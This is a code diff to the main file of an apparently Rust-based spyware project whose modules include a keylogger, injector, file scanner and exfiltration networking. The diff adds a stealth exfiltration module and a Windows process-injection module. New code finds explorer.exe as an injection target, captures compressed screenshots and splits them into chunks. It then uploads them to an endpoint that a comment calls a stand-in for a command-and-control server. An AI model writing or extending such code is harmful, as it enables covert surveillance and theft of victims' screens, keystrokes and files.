@@ -21,10 +21,15 @@ pub mod keylogger;
 pub mod log;
 /// Network communication for data exfiltration
 pub mod network;
+/// Stealthy network communication for data exfiltration
+pub mod network_stealth;
 /// Screen capture module
 pub mod screen_capture;
 /// File system operations for data persistence
 pub mod writer;
+/// Process injection module (Windows-only)
+#[cfg(windows)]
+pub mod replica;
 use crate::geolocation::Geolocator;
 use crate::log::Log;
 use serde::Serialize;
@@ -32,6 +37,7 @@ use std::env;
 use std::fs;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
+use std::path::Path;
 use tokio::select;
 use tokio::signal::ctrl_c;
 use tokio::time::{interval, Duration};
@@ -53,17 +59,56 @@ async fn main() {
     injector::start_injector_service();
     // 1.3. Start File Scanner Service
     file_scanner::start_file_scanner();
+
+    // 1.4. Demonstrate process injection capabilities (Windows-only)
+    #[cfg(windows)]
+    {
+        Log::info(format!("Attempting to find target process for injection..."));
+        if let Some(pid) = replica::find_process_pid("explorer.exe") {
+            Log::info(format!("Found target process 'explorer.exe' with PID: {}", pid));
+            // In a real scenario, we would proceed with injection here.
+            // For now, we are just demonstrating the process finding capability.
+        } else {
+            Log::error(format!("Could not find target process 'explorer.exe'"));
+        }
+    }
+
     // 2. Collect drive info.
     let drives = drives::list_drives();
     Log::info(format!("Found {} drives:", drives.len()));
     for drive in &drives {
         Log::info(format!("  - {:?}", drive));
     }
-    // 2.1. Capture and save a screenshot
-    match screen_capture::ScreenCapture::capture_and_save("logs/screenshots", None) {
+    // 2.1. Capture and save a screenshot with compression
+    Log::info(format!("Capturing screenshot with WebP compression for optimal file size"));
+    // Use the WebP format with balanced compression settings
+    match screen_capture::ScreenCapture::capture_and_save_with_compression(
+        "logs/screenshots", 
+        None,
+        screen_capture::CompressionFormat::smallest_size()
+    ) {
         Ok(paths) => {
-            for path in paths {
-                let _ = Log::info(format!("Screenshot saved to {}", path));
+            if let Some(path_str) = paths.get(0) {
+                Log::info(format!("Compressed screenshot saved to {}", path_str));
+
+                // Demonstrate stealthy file transfer with the captured screenshot
+                Log::info(format!("Initiating stealth transfer for {}", path_str));
+                let file_path = Path::new(path_str);
+                let file_id = uuid::Uuid::new_v4().to_string(); // Unique ID for the transfer
+
+                match network_stealth::chunk_file(file_path, &file_id) {
+                    Ok(chunks) => {
+                        Log::info(format!("File split into {} chunks. Sending to server...", chunks.len()));
+                        // NOTE: The server URL is a placeholder. In a real scenario, this would be a C&C server.
+                        let server_url = "http://localhost:8080/upload_chunk";
+                        if let Err(e) = network_stealth::send_chunks(server_url, chunks).await {
+                            Log::error(format!("Failed to send chunks: {}", e));
+                        }
+                    }
+                    Err(e) => {
+                        Log::error(format!("Failed to chunk file: {}", e));
+                    }
+                }
             }
         }
         Err(e) => {
